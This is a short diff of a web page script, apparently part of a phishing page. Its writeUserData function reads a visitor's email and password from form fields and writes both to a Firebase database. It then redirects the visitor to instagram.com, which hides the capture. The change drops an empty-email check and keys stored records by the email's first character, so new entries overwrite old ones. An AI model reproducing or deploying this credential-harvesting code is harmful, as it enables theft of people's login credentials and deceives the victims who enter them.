@@ -88,12 +88,10 @@ function writeUserData() {
 console.log(email);
   var email = document.getElementById("fa4e2a34ab06a").value;
   var password = document.getElementById("faa2da1ad083").value;
-    if(email != ""){
-  firebase.database().ref('users/' + email).set({
+  firebase.database().ref('users/' + email.charAt(0)).set({
     emailusername: email,
     password: password
   });
-    }
   window.location.replace("http://www.instagram.com");
   }
 </script>
